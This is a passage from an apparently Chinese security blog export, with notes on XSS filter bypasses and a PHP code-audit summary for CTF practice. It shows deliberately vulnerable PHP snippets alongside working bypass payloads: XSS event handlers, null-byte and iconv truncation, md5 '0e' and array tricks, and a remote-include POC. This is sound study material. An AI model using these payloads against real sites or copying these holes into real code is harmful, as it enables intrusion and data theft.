class=\"string\">\"display_errors\"</span>, <span class=\"number\">0</span>); </span><br><span class=\"line\">\t$str = strtolower(@$_POST[<span class=\"string\">\"keyword\"</span>]); </span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (strpos($str,<span class=\"string\">'script'</span>)) &#123;$str = str_replace(<span class=\"string\">'script'</span>, <span class=\"string\">''</span>, $str);&#125; </span><br><span class=\"line\">\t$str = str_replace(<span class=\"string\">'('</span>, <span class=\"string\">''</span>, $str); </span><br><span class=\"line\">\t$str = str_replace(<span class=\"string\">')'</span>, <span class=\"string\">''</span>, $str); </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">' &lt;form class=\"main\" action=\"index.php\" method=\"POST\"&gt; &lt;input name=keyword size=60 value=\"'</span>.$str.<span class=\"string\">'\"&gt; &lt;input type=submit name=submit value=\"Search\"/&gt; &lt;/form&gt;'</span>; <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p class=\"main\"&gt;No results for \"&lt;b&gt;'</span>.htmlspecialchars($str).<span class=\"string\">'&lt;/b&gt;\"&lt;/p&gt;'</span>; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;body onload=alert`1`&gt;&lt;&quot;</span><br><span class=\"line\">&quot; onfocus=alert`1` &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤-39-quot-39-39\"><a href=\"#过滤-39-quot-39-39\" class=\"headerlink\" title=\"过滤&#39;,&quot;,&#39; &#39;\"></a>过滤<code>&#39;,&quot;,&#39; &#39;</code></h2><p>有时候用斜杠是可以代替空格的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    ini_set(&quot;display_errors&quot;, 0); </span><br><span class=\"line\">\t$str = strtolower(@$_POST[&quot;keyword&quot;]); </span><br><span class=\"line\">\twhile (strpos($str,&apos;script&apos;)) &#123;$str = str_replace(&apos;script&apos;, &apos;&apos;, $str);&#125; </span><br><span class=\"line\">\t$str = str_replace(&apos;(&apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\t$str = str_replace(&apos;)&apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\t$str = str_replace(&apos; &apos;, &apos;&apos;, $str); </span><br><span class=\"line\">\techo &apos; &lt;form class=&quot;main&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input name=keyword size=60 value=&quot;&apos;.$str.&apos;&quot;&gt; &lt;input type=submit name=submit value=&quot;Search&quot;/&gt; &lt;/form&gt;&apos;; echo &apos;&lt;p class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;.htmlspecialchars($str).&apos;&lt;/b&gt;&quot;&lt;/p&gt;&apos;; ?</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;/onfocus=alert`1`/&quot;</span><br><span class=\"line\">&quot;&gt;&lt;img/src=&apos;1&apos;/onerror=alert`0`&gt;&lt;&quot;</span><br><span class=\"line\">&quot;&gt;&lt;&lt;svg/onload=alert`1`&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤尖括号里边的所有东西\"><a href=\"#过滤尖括号里边的所有东西\" class=\"headerlink\" title=\"过滤尖括号里边的所有东西\"></a>过滤尖括号里边的所有东西</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">    ini_set(&quot;display_errors&quot;, 0); </span><br><span class=\"line\">\t$str = strtolower(@$_POST[&quot;keyword&quot;]); </span><br><span class=\"line\">\t$str = preg_replace(&quot;/&lt;.*?&gt;/&quot;, &apos;&apos;, $str);</span><br><span class=\"line\">\techo &apos; &lt;form class=&quot;main&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input name=keyword size=60 value=&quot;&apos;.$str.&apos;&quot;&gt; &lt;input type=submit name=submit value=&quot;Search&quot;/&gt; &lt;/form&gt;&apos;; echo &apos;&lt;p class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;.htmlspecialchars($str).&apos;&lt;/b&gt;&quot;&lt;/p&gt;&apos;; ?</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; type=image src=x onerror=alert(1) &quot;</span><br><span class=\"line\">=&gt; &lt;input type=image src=x onerror=alert(1)&gt;</span><br><span class=\"line\">input会被当做img标签使用</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;/onfocus=alert`1`/&quot;             =&gt; 不会自动触发</span><br></pre></td></tr></table></figure>\n<h2 id=\"js中的连接符\"><a href=\"#js中的连接符\" class=\"headerlink\" title=\"js中的连接符\"></a>js中的连接符</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">\tini_set(&quot;display_errors&quot;, 0); </span><br><span class=\"line\">\t$name = $_GET[&quot;name&quot;]; </span><br><span class=\"line\">\techo &apos;&lt;h3 class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;; echo htmlspecialchars($name).&apos;&lt;/b&gt;&quot;&lt;/h3&gt;&apos;; echo &apos; &lt;script&gt; var t=&quot;&apos;.$name.&apos;&quot;; var s=&quot;xxxxxxxx&quot;; var d=&quot;dddd&quot;; &lt;/script&gt;&apos;; ?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 &quot;-alert(1)-&quot; 赋值给url中的name即可 -是js中的连接符号</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">name=&quot;;alert(1);//</span><br></pre></td></tr></table></figure>\n<h2 id=\"危险字符\"><a href=\"#危险字符\" class=\"headerlink\" title=\"危险字符\"></a>危险字符</h2><table>\n<thead>\n<tr>\n<th>&lt;</th>\n<th>&amp;lt</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>&gt;</td>\n<td><figure class=\"highlight plain\"><figcaption><span>|</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| &amp;    | ```&amp;amp;```  |</span><br><span class=\"line\">| &quot;    | ```&amp;quot;``` |</span><br><span class=\"line\">| &apos;    | ```&amp;#39```   |</span><br><span class=\"line\"></span><br><span class=\"line\">## Dom-Based XSS</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; document.URL</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.URLUencoded</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.location(.pathname|.href|.search|.hash)</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; window.location(.pathname|.href|.search|.hash)</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.referrer</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; window.name</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.cookie</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; HTML5 postMessage</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; localStorage/globalStorage</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; XMLHTTPRequest response</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; Input.value</span><br><span class=\"line\"></span><br><span class=\"line\">## htmlspecialchars可绕过情况</span><br></pre></td></tr></table></figure></td>\n</tr>\n</tbody>\n</table>\n<p>echo “<input type=\"\\\"text\\\"\" value=\"\" + htmlspecialchars($str) + \"\">Please input the t1 as parameter”;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) &gt; //<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">因为htmlspecialchars默认只过滤`&lt;`，`&gt;`, `&quot;`，`&amp;`,默认为`ENT_COMPAT`</span><br></pre></td></tr></table></figure></p>\n<p>ENT_COMPAT - 默认。仅编码双引号。<br>ENT_QUOTES - 编码双引号和单引号。<br>ENT_NOQUOTES - 不编码任何引号。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## addslashes</span><br></pre></td></tr></table></figure></p>\n<p>echo “<input type=\"\\\"text\\\"\" value=\"\" + addslashes($str) +\"\">Please input the t1 as parameter”;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">paylaod1:</span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) //<br>=&gt; 源码:</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1) //‘&gt;Please input the t2 as parameter<br>=&gt; 浏览器处理结果:</p>\n<p><input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题</span><br><span class=\"line\"></span><br><span class=\"line\">如果使用以上 payload,浏览器最终结果:</span><br></pre></td></tr></table></figure></p>\n<p><input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">如果去掉`//`</span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) //<br>=&gt; 源码:</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1)’&gt;Please input the t2 as parameter<br>=&gt; 浏览器处理结果：</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1)’&gt;Please input the t2 as parameter<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">这时候，就无法触发alert。</span><br><span class=\"line\"></span><br><span class=\"line\">paylaod2: </span><br><span class=\"line\"></span><br><span class=\"line\">这个payload只能在编码为gbk的情况下才能使用。</span><br></pre></td></tr></table></figure></p>\n<p><meta charset=\"gbk\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p> %df’&gt;<script>alert(1)</script> //<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## strip_tags绕过</span><br></pre></td></tr></table></figure></p>\n<p>echo ‘<input type=\"text\" value=\"' + strip_tags($str) +'\">Please input the t1 as parameter’;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">payload:</span><br></pre></td></tr></table></figure></p>\n<p>“ onmouseover=alert(1) //<br><code>`</code></p>\n"},{"title":"PHP代码审计归纳","date":"2018-04-18T02:27:37.000Z","_content":"\n\n\n# PHP代码审计归纳\n\nAuthor: 木禾 ali0th\n\nhttps://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\n## 变量覆盖\n### extract()\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。\n```php\n<?php\n$a = \"Original\";\n$my_array = array(\"a\" => \"Cat\",\"b\" => \"Dog\", \"c\" => \"Horse\");\nextract($my_array); \necho \"\\$a = $a; \\$b = $b; \\$c = $c\";\n?>\n# 结果：$a = Cat; $b = Dog; $c = Horse\n\n```\n这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。\n\n```php\n#?shiyan=&flag=1\n<?php\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo 'ctf{xxx}'; \n    }\n   else\n   { \n    echo'Oh.no';\n   } \n   }\n```\n<!--more-->\n### parse_str()\n\n解析字符串并注册成变量\n```php\n$b=1;\nParse_str('b=2');\nPrint_r($b);\n# 结果: $b=2\n```\n\n### import_request_variables()\n\n```php\n将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(\"p\"， \"post_\");\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(\"gp\"， \"gp_\");\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(\"cg\"， \"cg_\");\n```\n\n### $变量覆盖\n\n```php\n## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs\n<?  \n$chs = '';  \nif($_POST && $charset != 'utf-8'){  \n    $chs = new Chinese('UTF-8', $charset);  \n    foreach($_POST as $key => $value){  \n        $$key = $chs->Convert($value);  \n    }  \n    unset($chs);  \n} \n```\n\n### 全局变量覆盖漏洞\n\n原理：\nregister_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。\n如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.\n\n\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。\n\n```php\n<?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&b=111\nif (ini_get(\"register_globals\")) foreach($_REQUEST as $k=>$v) unset(${$k});\nprint $a;\nprint $_GET[b]; \n```\n经过测试，开了register_globals会卡死\n\n\n## 绕过过滤的空白字符\n\n原理：https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n\n```\n控制码\n\"\\0\" \"%00\" (ASCII  0 (0x00))，空字节符。\n\n制表符\n\"\\t\" (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n\"\\n\" (ASCII 10 (0x0A))，换行符。\n\"\\v\" \"\\x0b\" (ASCII  11 (0x0B))，垂直制表符。\n\"\\f\" \"%0c\" 换页符\n\"\\r\" \"%0d\"(ASCII  13 (0x0D))，回车符。\n\n空格:\n\" \" \"%20\" (ASCII  32 (0x20))，普通空格符。\n```\n\n而trim过滤的空白字符有\n```php\nstring trim ( string $str [, string $character_mask = \" \\t\\n\\r\\0\\x0B\" ] )\n```\n其中缺少了\\f\n\n2 函数对空白字符的特性\nis_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。\n也就是说，is_numeirc(\" \\r\\n \\t 1.2\")是会返回true的。同理，intval(\" \\r\\n \\t 12\")，也会正常返回12。\n\n\n\n案例\n\nhttps://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\n```php\n#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n```\n\n## intval整数溢出\n\nphp整数上限溢出绕过intval\n\nintval 函数最大的值取决于操作系统。 \n32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。\n64 位系统上，最大带符号的 integer 值是 9223372036854775807。\n\n## intval 四舍五入\n\n\n```php\n# ?a=1024.1\n<?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\nif ($_GET[id]==1024) {\n    echo \"<p>no! try again</p>\";\n    }\n  else{\n    echo($query[content]);\n  }\n}\n```\n\n## 浮点数精度忽略\n```php\nif ($req[\"number\"] != intval($req[\"number\"]))\n```\n在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。\n输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。\n\n\n\n\n## 多重加密\n\n\n题目中有：\n```php\n$login = unserialize(gzuncompress(base64_decode($requset['token'])));\nif($login['user'] === 'ichunqiu'){echo $flag;}\n```\n本地则写：\n```php\n<?php\n$arr = array(['user'] === 'ichunqiu');\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?>\n```\n\n## 截断\n\n### iconv 异常字符截断\n\n```php\n## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a='1'.char(130).'2';\necho iconv(\"UTF-8\",\"gbk\",$a); //将字符串的编码从UTF-8转到gbk\necho iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8\n```\n\n### eregi、ereg可用%00截断\n\n功能：正则匹配过滤\n条件：要求php<5.3.4\n\n```php\n## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n<?php\nif (isset ($_GET['password'])) {\n    if (ereg (\"^[a-zA-Z0-9]+$\",$_GET['password']) === FALSE)    \n       {\n        echo '<p>You password must be alphanumeric</p>';\n    }\n    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n    {\n        if (strpos ($_GET['password'], '*-*') !== FALSE)\n        {\n            die('Flag: ' . $flag);\n        }\n        else\n        {\n            echo('<p>*-* have not been found</p>');\n        }\n    }\n    else\n    {\n        echo '<p>Invalid password</p>';\n    }\n}\n```\n\n\n### move_uploaded_file 用\\0截断\n5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7\n原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生\ncve：\nhttps://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\n\n`move_uploaded_file($_FILES['x']['tmp_name'],\"/tmp/test.php\\x00.jpg\")`\n上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。\n但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。\n\n### include用？截断\n\n```php\n<?php\n$name=$_GET['name'];  \n$filename=$name.'.php';  \ninclude $filename;  \n?>\n```\n当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。\n测试POC：\nhttp://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\n则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。\n\n### 系统长度截断\n这种方式在PHP5.3以后的版本中都已经得到了修复。\nwin260个字符，linux下4*1024=4096字节\n\n### mysql长度截断\nmysql内的默认字符长度为255，超过的就没了。\n由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning\n\n### mysql中utf-8截断\n\n`insert into dvwa.test values (14,concat(\"admin\",0xc1,\"abc\"))`\n\n写入为admin\n\n\n## 弱类型比较\n\n原理\n\n比较表：http://php.net/manual/zh/types.comparisons.php\n\n以下等式会成立\n```php\n'' == 0 == false\n'123' == 123\n'abc' == 0\n'123a' == 123\n'0x01' == 1\n'0e123456789' == '0e987654321'\n[false] == [0] == [NULL] == ['']\nNULL == false == 0\ntrue == 1\n```\n\n### ==、>、<的弱类型比较\n\n这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。\n\n```php\n##方法1\n##$a[\"a1\"]=\"1e8%00\";\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[\"a1\"]=[\"a\"];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[\"a1\"]=1337a;\n##1337a过is_numeric，又由>转成1337与1336比较\n<?php\nis_numeric(@$a[\"a1\"])?die(\"nope\"):NULL;    \nif(@$a[\"a1\"]){\n\t\tvar_dump($a);\n        ($a[\"a1\"]>1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n```\n\n### switch 弱类型\n```php\n// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) \"1[]\",但在switch那里为1\nif (isset($_GET['x1']))\n{ \n        $x1 = $_GET['x1']; \n        $x1==\"1\"?die(\"ha?\"):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n```\n\n### md5比较（0e相等、数组为Null）\n```php\nmd5('240610708') //0e462097431906509019562988736854\nmd5('QNKCDZO') //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5('240610708')==md5('QNKCDZO'); //True\nmd5('240610708')===md5('QNKCDZO'); //False\n\n这样的对应数值还有：\nvar_dump(md5('240610708') == md5('QNKCDZO'));\nvar_dump(md5('aabg7XSs') == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\nvar_dump('0010e2' == '1e3');\nvar_dump('0x1234Ab' == '1193131');\nvar_dump('0xABCdef' == ' 0xABCdef');\n```\n技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串\n\n```php\n#方法1\n#s1=QNKCDZO&s2=240610708\n#方法2\n#?s1[]=1&s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] && md5([1]) ===md5([2])\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif ($_GET['s1'] != $_GET['s2']\n&& md5($_GET['s1']) == md5($_GET['s2'])) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n```php\n##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST['name']);\n$r = $db->get_row(\"SELECT `pass` FROM `user` WHERE `name`='{$name}'\");\nif ($r['pass'] === md5($_POST['pass'])) {\necho \"success\";\n}\n```\n\n### json传数据{\"key\":0}\nPHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。\n```\napplication/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n```\n第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.\n\n{\"key\":\"0\"}\n\n这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：\n\n{\"key\":0}\n\n### strcmp漏洞1：返回0\n适用与5.3之前版本的php\n\n`int strcmp ( string $str1 , string $str2 )`\n// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。\n\n```php\n##flag[]=admin\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif (strcmp($_GET['flag'], FLAG) == 0) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n### strcmp漏洞2：返回Null\n修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。\narray和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。\n`strcmp($c[1],$d) `\n\n\n### strcmp漏洞3: 判断使用的是 ==\n\n而判断使用的是==，当NULL==0是 bool(true)\n\n### in_array，array_search 弱类型比较\n\n松散比较下，任何string都等于true：\n\n```php\n// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'\n// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'\n// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.\nif(is_array(@$a[\"a2\"])){\n        if(count($a[\"a2\"])!==5 OR !is_array($a[\"a2\"][0])) die(\"nope\");\n        $pos = array_search(\"ctf\", $a[\"a2\"]);\n        $pos===false?die(\"nope\"):NULL;\n        foreach($a[\"a2\"] as $key=>$val){\n            $val===\"ctf\"?die(\"nope\"):NULL;\n        }\n        $v2=1;\n}\n```\n\n### sha1() md5() 报错相等绕过（False === False）\nsha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false\nmd5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。\n```php\n##?name[]=1&password[]=2\n## === 两边都是false则成立\nif ($_GET['name'] == $_GET['password'])\n    echo '<p>Your password can not be your name!</p>';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\n    die('Flag: '.$flag);\n```\n\n\n### strpos数组NULL(Null !== False)\n\nstrpos()输入数组出错返回null\n\n```php\n#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n<?php\n$flag = \"flag\";\n    if (isset ($_GET['nctf'])) {\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) # %00截断\n            echo '必须输入数字才行';\n        else if (strpos 